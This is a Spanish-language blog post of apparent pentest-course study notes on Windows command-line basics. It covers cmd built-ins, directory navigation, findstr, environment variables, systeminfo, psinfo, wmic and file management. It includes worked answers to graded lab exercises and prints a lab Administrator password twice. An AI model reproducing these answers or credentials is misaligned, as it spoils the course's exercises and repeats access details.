---
layout: post
title: Windows
subtitle: Windows Basics.
tags: [pen]
---
### 1. Windows Basics.

Una cosa destacable entre Windows y Linux es que los paths de los ficheros de Windows no son 'case-sensitive'. En Windows ambas rutas designan el mismo fichero:

```cmd
C:\> type HelloMoon.txt  

C:\> type helLoMoon.txt
```

<br />

#### 1.1. Windows Shells

**Shells**

Windows dispone de tres diferentes interfaces cli: *Command Prompt*, *PowerShell* y *WMIC*. Estos programas no son idénticos como muchas veces se asume y difieren en varios aspectos unos de otros.

Además, existe una cuarta recientemente añadida que es WSL; Windows Subsystem for Linux que simula un entorno de Linux en Windows.

- *Command Prompt*: Es una shell que contiene un conjunto de comandos que se emplean para interactuar con objetos de Win32. Al igual que Bash, cmd.exe se puede emplear para navegar por directorios, crear ficheros y correr scritps 'batch files'.

- *Windows PowerShell*: es un lenguaje orientado a la gestión de sistemas de ficheros y la automatización de tareas compuesta por una shell de línea de comandos, un lenguaje de secuencias de comandos y un marco de gestión de configuración.

- La utilidad de línea de comandos del Instrumental de administración de Windows (WMIC) proporciona una interfaz de línea de comandos para el Instrumental de administración de Windows (WMI). WMI permite que lenguajes de secuencias de comandos como VBScript y PowerShell administren sistemas Windows de forma local y remota. 

<br />

**Built-in Commands & Help**

En esta sección nos centraremos en el manejo del Command Prompt. Comencemos con una exploración de los comandos integrados de cmd.exe. Un *incorporado* es una función programada directamente en el shell. Similar a las funciones integradas de Bash, Windows cmd.exe tiene una gran cantidad de comandos que se programan directamente en el shell.

El primer comando para aprender es *help*. Cuando no se proporcionan argumentos, la ayuda muestra todos los demás comandos integrados.

```cmd
C:\>help
For more information on a specific command, type HELP command-name
ASSOC          Displays or modifies file extension associations.
ATTRIB         Displays or changes file attributes.
BREAK          Sets or clears extended CTRL+C checking.
BCDEDIT        Sets properties in boot database to control boot loading.
...
```

Aunque también podemos proporcionar un parámetro para obtener una ayuda más precisa, como información concreta de un comando:

```
C:\>help time
Displays or sets the system time.

TIME [/T | time]

Type TIME with no parameters to display the current time setting and a prompt
for a new one.  Press ENTER to keep the same time.

If Command Extensions are enabled the TIME command supports
the /T switch which tells the command to just output the
current time, without prompting for a new time.
```

También podemos obtener ayuda de un comando empleando el parámtero '/?':

```
C:\>time /?
Displays or sets the system time.

TIME [/T | time]

Type TIME with no parameters to display the current time setting and a prompt
for a new one.  Press ENTER to keep the same time.

If Command Extensions are enabled the TIME command supports
the /T switch which tells the command to just output the
current time, without prompting for a new time.
```

Algunos de los 'built-in' commands más utilizados son:

|Command|Description|
|-|-|
|cd|Cambia el directorio actual.|
|cls|Clear.|
|cmd|Comienza una nueva instancia del Command Prompt.|
|copy|Copia ficheros de una a otra localización.|
|del|Borra ficheros.|
|dir|Lista los contenidos de directorios y/o subdirectorios.|
|echo|Despliega mensajes or cambia el 'echoing' de los comandos.|
|erase|Borra una o más ficheros.|
|exit|Quita el programa cmd.exe.|
|find|Busca un patrón 'string' en el contenido de un fichero de texto.|
|findstr|Busca strings en ficheros.|
|mkdir|Crea un directorio.|
|move|Mueve ficheros de un directorio a otro.|
|ren|Renombra ficheros.|
|rmdir|Borra directorios.|
|type|Muestra el contenido de un fichero.|

#### 1.2. Window File System Navigation.

Cambiar directorios en Windows es muy similar a hacerlo en Zsh o Bash. *cd* cambia de directorio a la ruta de destino. En Linux, podemos usar *cd* sin parámetros para volver al directorio de inicio del usuario. *cd* con el parámetro / volverá al directorio raíz de la máquina (que no debe confundirse con el directorio de inicio del usuario raíz). En Windows, podemos usar cd\\ o cd/ para volver al directorio raíz de la unidad actual:

```
C:\Windows\Web>cd\

C:\>
```

En lugar de *cat*, Windows tiene tipo:

```
C:\Users\Offsec>type file.txt
This is a file on Windows.
```

Recuerde que Windows no considera que los nombres de archivo distingan entre mayúsculas y minúsculas, por lo que file.txt y FILE.TXT hacen referencia al mismo archivo. 

Si hay espacios en un nombre de archivo, debemos incluir el contenido entre comillas.

```
C:\Users\Offsec>type "Spaces In Title.txt"
"This file has spaces in its title"
```

El comando linux *ls* muestra el contenido del directorio de trabajo actual. En Windows, podemos usar el comando *dir* para mostrar el contenido del directorio de trabajo actual.

Tenga en cuenta que, a diferencia de su equivalente de Linux, ls, dir es un comando integrado. ls no es un Bash's builtin, sino un binario separado que vive en /usr/bin/ls en Kali.

```
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 1234-5678

 Directory of C:\Users
 
05/24/2021  04:53 PM    <DIR>          .
05/24/2021  04:53 PM    <DIR>          ..
05/24/2021  04:53 PM    <DIR>          Offsec
05/24/2021  04:43 PM    <DIR>          Public
               0 File(s)              0 bytes
               2 Dir(s)  32,935,755,776 bytes free
```

Podemos usar la opción /A con dir para mostrar archivos ocultos.

```
C:\Users>dir /A
 Volume in drive C has no label.
 Volume Serial Number is 1234-5678

 Directory of C:\Users

05/24/2021  04:53 PM    <DIR>          .
05/24/2021  04:53 PM    <DIR>          ..
05/24/2021  04:53 PM    <SYMLINKD>     All Users [C:\ProgramData]
05/24/2021  04:53 PM    <DIR>          Defaul
05/24/2021  04:53 PM    <JUNCTION>     Default User [C:\Users\Default]
05/24/2021  04:53 PM               174 desktop.ini
05/24/2021  04:53 PM    <DIR>          Offsec
05/24/2021  04:48 PM    <DIR>          Public
               1 File(s)            174 bytes
               5 Dir(s)  32,934,400,000 bytes free

C:\Users>
```

Finalmente, tenga en cuenta que la tecla \[TAB\] funciona ligeramente diferente en la terminal de Windows en comparación con muchos de los shells de Linux. En Windows, \[TAB\] recorrerá una lista de opciones predefinidas. Por ejemplo, si escribimos tipo f y luego comenzamos a presionar \[TAB\], recorrerá los archivos que comiencen con la letra f en el directorio actual.

**Filtrado Grep**

Podemos filtrar el contenido de comandos o ficheros con el comando 'find' o 'findstr'. A modo de ejemplo tenemos el siguiente comando:

```cmd
offsec@WINDOWS-01 C:\>dir /s /b /A| findstr flag                    
C:\flag.txt
C:\Long Journey\Of Unknown Perils\flag.txt
C:\RumbleInTheJungle\flag00.txt
C:\RumbleInTheJungle\flag01.txt
C:\RumbleInTheJungle\flag02.txt
C:\RumbleInTheJungle\flag03.txt
C:\RumbleInTheJungle\flag04.txt
C:\RumbleInTheJungle\flag05.txt
C:\RumbleInTheJungle\flag06.txt
C:\RumbleInTheJungle\flag07.txt
C:\RumbleInTheJungle\flag08.txt
C:\RumbleInTheJungle\flag09.txt
C:\RumbleInTheJungle\flag10.txt
C:\RumbleInTheJungle\flag11.txt
C:\RumbleInTheJungle\flag12.txt
C:\RumbleInTheJungle\flag13.txt
C:\RumbleInTheJungle\flag14.txt
C:\RumbleInTheJungle\flag15.txt
C:\RumbleInTheJungle\flag16.txt
C:\RumbleInTheJungle\flag17.txt
C:\RumbleInTheJungle\flag18.txt
C:\RumbleInTheJungle\flag19.txt
C:\RumbleInTheJungle\flag20.txt
C:\RumbleInTheJungle\flag21.txt
C:\RumbleInTheJungle\flag22.txt
C:\RumbleInTheJungle\flag23.txt
C:\RumbleInTheJungle\flag24.txt
C:\RumbleInTheJungle\flag25.txt
C:\RumbleInTheJungle\flag26.txt
C:\RumbleInTheJungle\flag27.txt
C:\RumbleInTheJungle\flag28.txt
C:\RumbleInTheJungle\flag29.txt
C:\RumbleInTheJungle\flag30.txt
C:\RumbleInTheJungle\flag31.txt
C:\RumbleInTheJungle\flag32.txt
C:\RumbleInTheJungle\flag33.txt
C:\RumbleInTheJungle\flag34.txt
C:\RumbleInTheJungle\flag35.txt
C:\RumbleInTheJungle\flag36.txt
C:\RumbleInTheJungle\flag37.txt
C:\RumbleInTheJungle\flag38.txt
C:\RumbleInTheJungle\flag39.txt
C:\RumbleInTheJungle\flag40.txt
C:\RumbleInTheJungle\flag41.txt
C:\RumbleInTheJungle\flag42.txt
C:\RumbleInTheJungle\flag43.txt
C:\RumbleInTheJungle\flag44.txt
C:\RumbleInTheJungle\flag45.txt
C:\RumbleInTheJungle\flag46.txt
C:\RumbleInTheJungle\flag47.txt
C:\RumbleInTheJungle\flag48.txt
C:\RumbleInTheJungle\flag49.txt
C:\RumbleInTheJungle\flag50.txt
C:\RumbleInTheJungle\flag51.txt
C:\RumbleInTheJungle\flag52.txt
C:\RumbleInTheJungle\flag53.txt
C:\RumbleInTheJungle\flag54.txt
C:\RumbleInTheJungle\flag55.txt
C:\RumbleInTheJungle\flag56.txt
C:\RumbleInTheJungle\flag57.txt
C:\RumbleInTheJungle\flag58.txt
C:\RumbleInTheJungle\flag59.txt
C:\RumbleInTheJungle\flag60.txt
C:\RumbleInTheJungle\flag61.txt
C:\RumbleInTheJungle\flag62.txt
C:\RumbleInTheJungle\flag63.txt
C:\RumbleInTheJungle\flag64.txt
C:\RumbleInTheJungle\flag65.txt
C:\RumbleInTheJungle\flag66.txt
C:\RumbleInTheJungle\flag67.txt
C:\RumbleInTheJungle\flag68.txt
C:\RumbleInTheJungle\flag69.txt
C:\RumbleInTheJungle\flag70.txt
C:\RumbleInTheJungle\flag71.txt
C:\RumbleInTheJungle\flag72.txt
C:\RumbleInTheJungle\flag73.txt
C:\RumbleInTheJungle\flag74.txt
C:\RumbleInTheJungle\flag75.txt
C:\RumbleInTheJungle\flag76.txt
C:\RumbleInTheJungle\flag77.txt
C:\RumbleInTheJungle\flag78.txt
C:\RumbleInTheJungle\flag79.txt
C:\RumbleInTheJungle\flag80.txt
C:\RumbleInTheJungle\flag81.txt
C:\RumbleInTheJungle\flag82.txt
C:\RumbleInTheJungle\flag83.txt
C:\RumbleInTheJungle\flag84.txt
C:\RumbleInTheJungle\flag85.txt
C:\RumbleInTheJungle\flag86.txt
C:\RumbleInTheJungle\flag87.txt
C:\RumbleInTheJungle\flag88.txt
C:\RumbleInTheJungle\flag89.txt
C:\RumbleInTheJungle\flag90.txt
C:\RumbleInTheJungle\flag91.txt
C:\RumbleInTheJungle\flag92.txt
C:\RumbleInTheJungle\flag93.txt
C:\RumbleInTheJungle\flag94.txt
C:\RumbleInTheJungle\flag95.txt
C:\RumbleInTheJungle\flag96.txt
C:\RumbleInTheJungle\flag97.txt
C:\RumbleInTheJungle\flag98.txt
C:\RumbleInTheJungle\flag99.txt
C:\Users\Offsec\AppData\Searching03.flag
C:\Users\Offsec\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Offsec\Desktop\flag.txt
```

El comando anterior lista los contenidos del directorio raiz de forma recursiva y mostrando directorios ocultos y seguidamente manda el output con el pipe '|' sobre 'findstr' que buscará nuestro patrón en dicho output.

**Exercises**

**Hay varias banderas falsas en el directorio C:\\RumbleInTheJungle . El archivo que se editó más recientemente contiene el indicador verdadero**


```cmd
offsec@WINDOWS-01 C:\RumbleInTheJungle>dir /OD  
```

<br />

**Windows FileSystem**

En esta sección, presentaremos el *filesystem* de Windows predeterminada. Como se describió anteriormente, la unidad C:\\ es el directorio raíz de la partición primaria en Windows.

Normalmente, C:\\ contiene los siguientes directorios y subdirectorios estándar: \\ , \\PerfLogs , \\Program Files , \\Program Files (x86) , \\ProgramData , \\Users , \\Windows .

```
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\

05/24/2021  04:53 PM     <DIR>          PerfLogs
05/24/2021  04:53 PM     <DIR>          Program Files
05/24/2021  04:53 PM     <DIR>          Program Files (x86)
05/24/2021  04:53 PM     <DIR>          Users
05/24/2021  04:53 PM     <DIR>          Windows
               1 File(s)        378,568 bytes
               5 Dir(s)  32,926,023,680 bytes free

C:\>
```

- *\\PerfLogs*: Este directorio almacena registros del funcionamiento del sistema (Windows performance), pero generalmente está vacío en una configuración predeterminada de Windows.

- *\\Program Files*: Este directorio se encuentra en las versiones de Windows de 32 y 64 bits. En las ediciones de 32 bits, este es el único directorio de archivos de programa disponible y almacena programas de 32 bits. En las versiones de Windows de 64 bits, este directorio almacena programas de 64 bits.
   
- *\\Program Files (x86)*: este directorio se puede encontrar en las ediciones de Windows de 64 bits y almacena versiones de programas de 32 bits.
  
- *\\ProgramData*: Este es un directorio oculto que contiene datos de programas a los que se espera que accedan los programas de computadora, independientemente de la cuenta de usuario que haya iniciado sesión.

- *\\Users*: Cada usuario que haya iniciado sesión en el sistema operativo al menos una vez tendrá un subdirectorio creado bajo su nombre en este directorio. Similar al directorio /home en Unix.

- *\\Users\\Public*: Este es un subdirectorio de \\Users y contiene datos de usuario. Todos los usuarios pueden acceder a él y se utiliza para compartir archivos entre ellos. También se puede acceder a través de la red desde cuentas de usuario válidas con permisos de acceso remoto.

- *\\Users\\\[UserName]\\AppData*: este es un subdirectorio oculto de \\Users. **Almacena datos de aplicaciones y configuraciones para cada usuario**. \\AppData contiene tres subcarpetas adicionales, a saber, \\Roaming , \\Local y LocalLow. \\Roaming se usa para inicios de sesión basados ​​en la red para perfiles móviles y sincroniza los datos del usuario cuando inician sesión en la computadora. El directorio temporal por usuario de Windows, \\Temp , se puede encontrar aquí en \\Local los contenidos de este directorio.

- *\\Windows*: Esto almacena la instalación principal de Windows y contiene archivos relacionados con el propio sistema operativo.

- *\\System, \\System32 y \\SysWOW64*: Estos directorios almacenan archivos DLL que  son utilizadas por las funciones principales de Windows y la API de Windows. La nomenclatura de estos directorios puede resultar un poco confusa. \\System almacena archivos DLL de 16 bits y generalmente está vacío en las ediciones de Windows de 64 bits porque las aplicaciones de 16 bits no se pueden ejecutar en sistemas operativos de 64 bits. \\System32 almacena archivos DLL de 32 o 64 bits, dependiendo de si se está ejecutando una edición de Windows de 32 o 64 bits. \\SysWOW64 se encuentra solo en ediciones de Windows de 64 bits y, a pesar de su nombre, almacena archivos DLL de 32 bits.

<br />

#### 1.3. System Information & Enviroment Variables.

*systeminfo.exe* es un binario de Windows capaz de extraer información sobre el sistema en el que se ejecuta. También se puede ejecutar en máquinas remotas si se proporciona la opción /s .

```
C:\>systeminfo

Host Name:                 Offsec-Machine
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19041 N/A Build 19041
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Offsec
...
```

Aunque systeminfo no es un built-in command, aún podemos usar el parámetro /? para consultar la información de uso del programa:

```
C:\>systeminfo /?

SYSTEMINFO [/S system [/U username [/P [password]]]] [/FO format] [/NH]

Description:
    This tool displays operating system configuration information for
    a local or remote machine, including service pack levels.

Parameter List:
    /S      system           Specifies the remote system to connect to.

    /U      [domain\]user    Specifies the user context under which
                             the command should execute.

    /P      [password]       Specifies the password for the given
                             user context. Prompts for input if omitted.

    /FO     format           Specifies the format in which the output
                             is to be displayed.
                             Valid values: "TABLE", "LIST", "CSV".

    /NH                      Specifies that the "Column Header" should
                             not be displayed in the output.
                             Valid only for "TABLE" and "CSV" formats.

    /?                       Displays this help message.

Examples:
    SYSTEMINFO
    SYSTEMINFO /?
    SYSTEMINFO /S system
    SYSTEMINFO /S system /U user
    SYSTEMINFO /S system /U domain\user /P password /FO TABLE
    SYSTEMINFO /S system /FO LIST
    SYSTEMINFO /S system /FO CSV /NH
```

Windows es capaz de almacenar *variables de entorno* o enviroment vars, similares a las que se encuentran en Linux.

Algunas de las variables de entorno de Windows más utilizadas incluyen las siguientes.

|ENVIROMENT VARIABLE|PURPOSE|
|-|-|
|PATH|Contiene las rutas en las que el sistema busca ejecutables que se llaman desde la línea de comandos.|
|USERNAME|Muestra el nombre del usuario actual.|
|TEMP|Devuelve la localicación de la carpeta TEMP del usuario actual.|
|USERPROFILE|Devuelve el "home" del usuario actual|

En Conceptos básicos de Linux, aprendimos que podíamos hacer referencia a variables de entorno Bash o Zsh con la sintaxis \$\<NOMBRE-VARIABLE\>. En Windows, necesitamos envolver el nombre de la variable en signos de porcentaje así: \%\<NOMBRE-VARIABLE\>\%.

Por ejemplo, podemos usar el comando echo para recuperar nuestro nombre de usuario.

```
C:\>echo username
username

C:\>echo $username
$username

C:\>echo %username%
Offsec
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230119234351.png' | relative_url }}" text-align="center"/>
</div>

En el listado 12, tenga en cuenta que los dos primeros comandos simplemente generan la cadena literal proporcionada para hacer eco como entrada.

Podemos acceder a todas las variables de entorno con comando *set* cuando se usa sin parámetros, mostrará todas las variables de entorno almacenadas actualmente.

```
C:\>set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Offsec\AppData\Roaming
asl.log=Destination=file
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=Offsec-Machine
ComSpec=C:\WINDOWS\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
FPS_BROWSER_USER_PROFILE_STRING=Defaul
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Offsec\AppData\Local
LOGONSERVER=\\Offsec-Machine
NUMBER_OF_PROCESSORS=8
OneDrive=C:\Users\Offsec\OneDrive
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;
...
```


El comando *set* también se puede usar para cambiar temporalmente el valor de una variable de entorno en el contexto del shell actual. 

El comando *setx* se puede usar para cambiar un valor de forma permanente modificando el registro. Aprenderemos más sobre el registro de Windows en una sección a continuación.

<br />

**Exercises**

**5.  Create a system-wide environment variable called MYFLAG, and give it the value "CanIPleaseHaveTheFlag". Then, run the binary at  C:\\Users\\Offsec\\Desktop\\environment_check.exe to get the flag.**

En primer lugar seteamos temporalmente la variable con 'SET' según sabmeos de la teoría. Para ello buscamos en la ayuda de 'SET':

```cmd
C:\Users\Offsec>SET /?
Displays, sets, or removes cmd.exe environment variables.

SET [variable=[string]]

[...]

Two new switches have been added to the SET command:

    SET /A expression
    SET /P variable=[promptString]

[...]
```

De esta forma empleamos el siguiente comando estándo seguros de estar en la cuenta Administrator:ProtractJoshuaSupernal993 (ya que la máquina ofrece otras credenciales):

```cmd
administrator@WINDOWS-01 C:\Users\Offsec\Desktop>set MYFLAG=CanIPleaseHaveTheFlag 
```

Y acto seguido ejecutamos el binario del escritorio de nuestro usuario:

```cmd
administrator@WINDOWS-01 C:\Users\Offsec>environment_check.exe
```

<br />

**SysInternals & Psinfo**

La funcionalidad integrada de muchos de los comandos del símbolo del sistema de Windows es limitada en comparación con los shells de Unix como Bash. Microsoft ha desarrollado un conjunto de herramientas que, en conjunto, ayudan a crear un entorno de línea de comandos sólido para la administración del sistema, denominados colectivamente *Sysinternals System Information Utilities*. Tenga en cuenta que Sysinternals no viene con Windows por defecto, pero podemos descargarlo desde el sitio web de Microsoft.

La cantidad de programas incluidos en la suite es bastante grande y va mucho más allá de lo que podemos cubrir aquí. A continuación, repasaremos solo una de las herramientas que pueden ser útiles para los evaluadores de seguridad, *psinfo*. Lo alentamos a explorar la amplia variedad de otros programas por su cuenta.

Al ejecutar cualquiera de las herramientas de Sysinternals por primera vez, deberemos aceptar el Acuerdo de licencia de usuario final (eula). El EULA también se puede aceptar a través de la línea de comandos para cada utilidad con la opción /accepteula . Después de aceptar el EULA, podemos ejecutar psinfo sin argumentos ni opciones. Esto mostrará información vital del sistema local.

```
C:\Users\Offsec\Downloads\SysinternalsSuite>psinfo

PsInfo v1.78 - Local and remote system information viewer
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

System information for \\Offsec-Machine:
Uptime:                    1 day 3 hours 6 minutes 15 seconds
Kernel version:            Windows 10 Enterprise, Multiprocessor Free
Product type:              Professional
Product version:           6.3
Service pack:              0
Kernel build number:       19041
Registered organization:
Registered owner:          Offsec
IE version:                9.0000
System root:               C:\WINDOWS
Processors:                8
...
```

La herramienta psinfo es bastante versátil y puede recuperar información relacionada con la seguridad, el software instalado, los parches del sistema, el volumen del disco y más. Incluso se puede utilizar en una máquina remota. Lo dejamos como ejercicio para determinar cómo trabajar más con él. Recuerda usar /? Si te atascas.

Psinfo no es la única herramienta que puede extraer esta información. Se puede hacer con PowerShell y wmic. Cubriremos esos temas más adelante, pero explorar la funcionalidad ahora puede ayudar en las preguntas a continuación. Especialmente, si una herramienta no produce resultados.

<br />

**Exercises**

**1. ¿Qué opción debe configurar en cualquier herramienta sysinternals la primera vez que use esa herramienta específica?**

Siempre que utilicemos por primera vez una herramienta de 'sysinternals' tenemos que lanzarla con una opción denominada /accepteula para aceptar unos términos que de otra forma bloquearían la ejecución del binario.

```
C:\Users\Offsec\Downloads\SysnternalsSuite> psinfo /accepteula
```

<br />

**2. ¿Qué opción podemos usar con psinfo para mostrar información de revisiones?**

Lanzamos y leemos la ayuda del binario después de haber aceptado el eula con /accepteula 

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Downloads\SysinternalsSuite>psinfo /?         

PsInfo v1.78 - Local and remote system information viewer
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

PsInfo returns information about a local or remote Windows NT/2000/XP system.        

Usage: psinfo [-h] [-s] [-d] [-c [-t delimiter]] [filter] [\\computer[,computer[,..]]
|@file [-u Username [-p Password]]]
     -u        Specifies optional user name for login to
               remote computer.
     -p        Specifies password for user name.
     -h        Show installed hotfixes.
[...]
```

Vemos que la opción que buscamos es '-h'.

<br />

**3. Es hora de pensar fuera de la caja. Inicie sesión en la máquina de destino con las credenciales Administrator: ProtractJoshuaSupernal993 y use una nueva herramienta para averiguar en qué fecha se instaló el hotfix KB5003637.**

Para ello vamos a utilizar wmic qfe que es un comando que revisa actualizaciones de seguridad:

```cmd
administrator@WINDOWS-01 C:\Users\Offsec\Downloads\SysinternalsSuite>wmic qfe | find "5003637"
https://support.microsoft.com/help/5003637  WINDOWS-01  Security Update
 KB5003637               NT AUTHORITY\SYSTEM  6/8/2021
```

Por lo tanto la respuesta es: 6/8/2021.

<br />

**4. ¿Cuál es el nombre completo de la aplicación instalada en la máquina que se refiere al estado del sistema?**

Empleamos la utilidad wmic para introducir en un fichero una lista de aplicaciones instaldas en el sistema y seguidamente buscar en dicho fichero el patrón buscado.

```cmd
administrator@WINDOWS-01 C:\>wmic

wmic:root\cli>/output:C:\InstalledPrograms.txt product get name,version                 
wmic:root\cli>exit

administrator@WINDOWS-01 C:\>type InstalledPrograms.txt | find "Health" 
Microsoft Update Health Tools                                   2.77.0.0
```

<br />


#### 1.4. Managing Files From the Command Line.

Administrar archivos con el Command Prompt o CMD es muy similar a hacerlo con Zsh o Bash, con algunas diferencias sintácticas y funcionales a tener en cuenta.

- *Echo & Type*

Podemos escribir un nuevo archivo con el comando "echo". Además, como se mencionó en la sección anterior, "type" envía el output de un fichero a la terminal como lo haría "cat".

```
C:\Users\Offsec>echo "New File" > NewFile.txt

C:\Users\Offsec>type NewFile.txt
"New File"
```

Observe que las comillas fueron capturadas por el comando echo.

Para crear un archivo vacío, podemos ejecutar echo sin argumentos y redirigir el *stderr* al nombre de archivo que queremos crear:

```
C:\Users\Offsec>echo 2> EmptyFile.txt
```

En el ejemplo anterior, el comando echo no es directamente responsable de producir el archivo vacío. En su lugar, usamos el operador 2> para redirigir todos los errores provocados por el echo al archivo especificado. Dado que echo no produce errores, el archivo se crea sin contenido. Como ejercicio para el lector, siga adelante y pruebe lo que sucede si ejecuta "notacommand 2> File.txt".

<br />

- *Del*

El comando *del* es similar al rm de Linux y eliminará archivos.

```
C:\Users\Offsec>del EmptyFile.txt

C:\Users\Offsec>type EmptyFile.txt
The system cannot find the file specified.
```

<br />

- *Ren & Move*

Podemos renombrar archivos con rename o ren , y podemos moverlos a un directorio diferente con move.

```
C:\Users\Offsec>rename NewFile.txt RenamedFile.txt

C:\Users\Offsec>type RenamedFile.txt
"New File"

C:\Users\Offsec>move RenamedFile.txt .\Music
        1 file(s) moved.
```

En el ejemplo anterior, primero renombramos NewFile.txt y notamos que nuestro contenido se ha conservado. Luego intentamos mover el archivo al directorio \\Music . El error que recibimos se debe a que estamos tratando de moverlo a la carpeta \\Music *absoluta* en lugar de a la carpeta *relativa* en nuestro directorio de trabajo actual. Resolvemos el problema en el siguiente ejemplo usando el punto (.) para especificar nuestro directorio actual. También podríamos haber usado move RenamedFile.txt C:\\Users\\Offsec\\Music en su lugar.

<br />

- *mkdir & rmdir*

Al igual que los comandos de Linux, mkdir y rmdir crearán y eliminarán carpetas.

```
C:\Users\Offsec>mkdir ANewDirectory

C:\Users\Offsec>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec

05/24/2021  10:36 PM    <DIR>          ANewDirectory
05/24/2021  10:36 PM    <DIR>          Contacts
05/24/2021  10:36 PM    <DIR>          Desktop
...

C:\Users\Offsec>rmdir ANewDirectory

C:\Users\Offsec>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec
 
05/24/2021  10:36 PM    <DIR>          Contacts
05/24/2021  10:36 PM    <DIR>          Desktop
...
```

En el ejemplo anterior, creamos un nuevo directorio, verificamos su existencia con el comando *dir* y luego lo eliminamos. Finalmente comprobamos que se ha borrado con dir una vez más.

El comando rmdir también se puede usar para eliminar un directorio que tiene contenido dentro. Para hacerlo, necesitaremos usar la opción /S .

```
C:\Users\Offsec>mkdir ThisFolder

C:\Users\Offsec>echo Has Stuff > .\ThisFolder\HasStuff.txt

C:\Users\Offsec>rmdir .\ThisFolder
The directory is not empty.

C:\Users\Offsec>rmdir /S .\ThisFolder
.\ThisFolder, Are you sure (Y/N)? y
```

En el ejemplo anterior, creamos un directorio y colocamos un archivo de texto dentro de él. Intentamos eliminarlo sin la opción /S , pero recibimos un error. Una vez que invocamos correctamente la opción /S , recibimos un aviso para verificar que realmente queríamos eliminar el directorio. Efectivamente, el /S añade una funcionalidad de recursividad al comando.

<br />

- *copy & fc*

Podemos usar *copy* para copiar el contenido de un archivo a otro.

```
C:\Users\Offsec>cd Music

C:\Users\Offsec\Music>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec\Music

05/24/2021  10:36 PM    <DIR>          .
05/24/2021  10:36 PM    <DIR>          ..
05/24/2021  10:36 PM                13 RenamedFile.txt
               1 File(s)             13 bytes
               2 Dir(s)  32,479,846,400 bytes free

C:\Users\Offsec\Music>copy RenamedFile.txt ThisIsntMusic.txt
        1 file(s) copied.

C:\Users\Offsec\Music>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec\Music

05/24/2021  10:36 PM    <DIR>          .
05/24/2021  10:36 PM    <DIR>          ..
05/24/2021  10:36 PM                13 RenamedFile.txt
05/24/2021  10:36 PM                13 ThisIsntMusic.txt
               2 File(s)             26 bytes
               2 Dir(s)  32,479,580,160 bytes free

C:\Users\Offsec\Music>fc RenamedFile.txt ThisIsntMusic.txt
Comparing files RenamedFile.txt and THISISNTMUSIC.TXT
FC: no differences encountered
```

Aquí copiamos el contenido de RenamedFile.txt a un nuevo archivo. Usamos dir para verificar, pero luego introducimos el comando *fc* que compara el contenido de dos archivos de manera elegante.

Los comandos *xcopy* y *robocopy* son versiones más robustas de copy que se usan a menudo en scripts por lotes. Si bien xcopy ha quedado obsoleto, robocopy es muy útil porque tiene una alta tolerancia a las interrupciones de la red. También tiene varias otras características poderosas que son útiles para la auditoría de seguridad.

<br />

- *mklink*

Windows incluye la capacidad de crear enlaces simbólicos suaves (soft) y duros (hard), similar a lo que encontrará en Linux. Un enlace simbólico esencialmente apunta a otro archivo o directorio. 

- Un enlace simbólico suave es el equivalente a un atajo. Es decir, redirige los intentos de conexión para invocar el archivo vinculado al original.

- Un enlace simbólico duro hace que parezca que el archivo o directorio al que se hace referencia realmente existe en la misma ubicación que la ubicación del enlace. Esto puede ser útil cuando se trabaja con programas que requieren acceso a archivos o directorios específicos.

El comando *mklink* se usa para crear un enlace simbólico en Windows y admite la creación de enlaces simbólicos suaves y duros. El primer argumento de mklink es el nombre del enlace, y el segundo argumento es el nombre del objetivo al que queremos enlazar.

Para crear un enlace simbólico suave a un archivo de texto, podemos ejecutar mklink sin opciones adicionales:

```
C:\Users\Offsec>echo This is the file we want to link to > fileToBeLinkedTo.txt

C:\Users\Offsec>type fileToBeLinkedTo.txt
This is the file we want to link to

C:\Users\Offsec>mklink softlink fileToBeLinkedTo.txt
symbolic link created for softlink <<===>> fileToBeLinkedTo.txt

C:\Users\Offsec>type softlink
This is the file we want to link to

C:\Users\Offsec>dir softlink
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec

05/25/2021  09:23 PM    <SYMLINK>      softlink [fileToBeLinkedTo.txt]
               1 File(s)              0 bytes
               0 Dir(s)  32,479,338,496 bytes free
```

Revisemos este listado. Primero, creamos un nuevo archivo de texto y creamos un enlace simbólico que apunta a él. Cuando invocamos el enlace simbólico con tipo, obtenemos la salida del archivo vinculado. Luego usamos dir para verificar el tipo de archivo del enlace simbólico y notamos que se llama "\<SYMLINK\>".

Hagamos el mismo ejercicio con un enlace simbólico duro. Para crear un enlace fijo, usamos la misma sintaxis pero también empleamos la opción /h.

```
C:\Users\Offsec>echo This is another file to link to > secondFile.txt

C:\Users\Offsec>type secondFile.txt
This is another file to link to

C:\Users\Offsec>mklink /h hardlink secondFile.txt
Hardlink created for hardlink <<===>> secondFile.txt

C:\Users\Offsec>type hardlink
This is another file to link to

C:\Users\Offsec>dir hardlink

05/25/2021  09:24 PM                34 hardlink
               1 File(s)             34 bytes
               0 Dir(s)  32,478,904,320 bytes free
```

Tenga en cuenta que el archivo de enlace duro tiene un tipo de archivo normal y no contiene la etiqueta "\<SYMLINK\>". Si tuviéramos que cambiar el contenido de secondFile.txt, el enlace duro permanecería sin cambios.

<br />

**Exercises**

